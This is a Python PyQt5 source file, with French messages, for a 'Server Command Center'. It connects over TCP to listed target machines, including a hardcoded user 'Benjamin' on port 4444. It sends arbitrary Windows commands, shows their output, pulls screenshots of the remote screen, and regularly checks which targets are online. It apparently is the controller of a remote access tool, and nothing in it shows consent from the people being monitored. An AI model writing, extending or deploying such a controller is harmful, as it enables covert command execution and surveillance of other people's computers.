import socket
from PyQt5.QtWidgets import QWidget, QVBoxLayout, QLabel, QLineEdit, QTextEdit, QPushButton, QComboBox, QGroupBox, QFormLayout
from PyQt5.QtCore import QThread, pyqtSignal, QTimer
from utils import check_connection, create_status_icon
import os
import struct

class ScreenshotThread(QThread):
    update_status_signal = pyqtSignal(str)

    def __init__(self, conn):
        super().__init__()
        self.conn = conn

    def run(self):
        """Réception du screenshot avec le nom personnalisé."""
        try:
            self.conn.send(b"SCREENSHOT")

            data = self.conn.recv(4)
            if len(data) < 4:
                self.update_status_signal.emit("[!] Erreur: Taille du fichier non reçue.")
                return

            file_size = struct.unpack("!I", data)[0]  # Taille du fichier
            filename = self.conn.recv(100).decode().strip()  # Nom du fichier

            save_path = os.path.join(os.path.expanduser("~"), "Downloads", filename)

            received_bytes = 0
            with open(save_path, "wb") as file:
                while received_bytes < file_size:
                    chunk = self.conn.recv(min(4096, file_size - received_bytes))
                    if not chunk:
                        break
                    file.write(chunk)
                    received_bytes += len(chunk)

            if received_bytes == file_size:
                self.update_status_signal.emit(f"[+] Screenshot reçu: {save_path}")
            else:
                self.update_status_signal.emit("[!] Erreur: Fichier incomplet reçu.")

        except Exception as e:
            self.update_status_signal.emit(f"[!] Erreur lors de la réception: {str(e)}")
        finally:
            self.quit()

    def stop(self):
        """Arrête proprement le thread"""
        self.running = False
        self.wait()

class CommandCenter(QWidget):
    def __init__(self):
        super().__init__()

        self.setWindowTitle("Server Command Center")
        self.setGeometry(100, 100, 600, 400)

        self.conn = None  # Connexion socket

        # Liste des utilisateurs prédéfinis (Nom, IP, Port)
        self.users = {
            "Benjamin": ("172.16.80.83", 4444)
        }

        self.init_ui()

        # Démarrer la mise à jour des statuts toutes les 5 minutes
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.update_user_status)
        self.timer.start(300000)

    def init_ui(self):
        layout = QVBoxLayout()

        connection_group = QGroupBox("Connexion")
        connection_layout = QFormLayout()

        self.user_list = QComboBox(self)
        self.user_list.addItem("Sélectionner un client")
        for user in self.users.keys():
            self.user_list.addItem(user)
        self.user_list.currentIndexChanged.connect(self.on_user_selected)

        self.ip_input = QLineEdit(self)
        self.ip_input.setPlaceholderText("Entrez l'IP du client")

        self.port_input = QLineEdit(self)
        self.port_input.setPlaceholderText("Entrez le port")

        connection_layout.addRow("Utilisateur :", self.user_list)
        connection_layout.addRow("IP :", self.ip_input)
        connection_layout.addRow("Port :", self.port_input)
        connection_group.setLayout(connection_layout)

        self.command_input = QTextEdit(self)
        self.command_input.setPlaceholderText("Entrez une commande Windows...")
        self.command_input.setFixedHeight(80)

        self.output_display = QTextEdit(self)
        self.output_display.setReadOnly(True)

        self.connect_button = QPushButton("Se connecter", self)
        self.connect_button.clicked.connect(self.toggle_connection)

        self.execute_button = QPushButton("Exécuter commande", self)
        self.execute_button.clicked.connect(self.execute_command)

        self.screenshot_button = QPushButton("Prendre un screenshot", self)
        self.screenshot_button.clicked.connect(self.request_screenshot)

        layout.addWidget(connection_group)
        layout.addWidget(self.command_input)
        layout.addWidget(self.execute_button)
        layout.addWidget(self.screenshot_button)
        layout.addWidget(self.output_display)
        layout.addWidget(self.connect_button)

        self.setLayout(layout)

        self.update_user_status()

        # Variable pour stocker le thread de screenshot
        self.screenshot_thread = None

    def on_user_selected(self):
        user = self.user_list.currentText()
        if user in self.users:
            ip, port = self.users[user]
            self.ip_input.setText(ip)
            self.port_input.setText(str(port))
            self.toggle_connection()

    def toggle_connection(self):
        if self.conn:
            self.disconnect_from_client()
        else:
            self.connect_to_client()

    def connect_to_client(self):
        host = self.ip_input.text()
        port = self.port_input.text()

        if not host or not port:
            self.output_display.append("[!] IP et port requis pour se connecter.")
            return

        try:
            self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.conn.connect((host, int(port)))
            self.output_display.append(f"[+] Connecté à {host}:{port}")
            self.connect_button.setText("Se déconnecter")
        except Exception as e:
            self.output_display.append(f"[!] Échec de la connexion: {str(e)}")

    def disconnect_from_client(self):
        if self.conn:
            try:
                self.conn.close()
                self.conn = None
                self.output_display.append("[-] Déconnecté du client.")
                self.connect_button.setText("Se connecter")
            except Exception as e:
                self.output_display.append(f"[!] Erreur lors de la déconnexion: {str(e)}")

    def execute_command(self):
        if not self.conn:
            self.output_display.append("[!] Pas de connexion établie.")
            return

        command = self.command_input.toPlainText().strip()
        if not command:
            self.output_display.append("[!] Aucune commande saisie.")
            return

        try:
            self.conn.send(command.encode())
            result = self.conn.recv(4096)
            self.output_display.append(result.decode('utf-8', errors='replace'))
        except Exception as e:
            self.output_display.append(f"[!] Erreur lors de la réception des résultats: {str(e)}")

    def request_screenshot(self):
        if not self.conn:
            self.output_display.append("[!] Pas de connexion établie.")
            return

        # Si un thread de screenshot est déjà en cours, on le stoppe avant de démarrer un nouveau
        if self.screenshot_thread and self.screenshot_thread.isRunning():
            self.screenshot_thread.stop()
        
        # Démarrer un nouveau thread pour recevoir le screenshot
        self.screenshot_thread = ScreenshotThread(self.conn)
        self.screenshot_thread.update_status_signal.connect(self.update_output_display)
        self.screenshot_thread.start()

    def update_output_display(self, message):
        """Mise à jour de l'interface avec le message du thread."""
        self.output_display.append(message)

    def update_user_status(self):
        """Met à jour les statuts des utilisateurs en tentant une connexion socket."""
        for i in range(1, self.user_list.count()):
            user = self.user_list.itemText(i)
            ip, port = self.users[user]

            icon = create_status_icon("green" if check_connection(ip, port) else "red")
            self.user_list.setItemIcon(i, icon)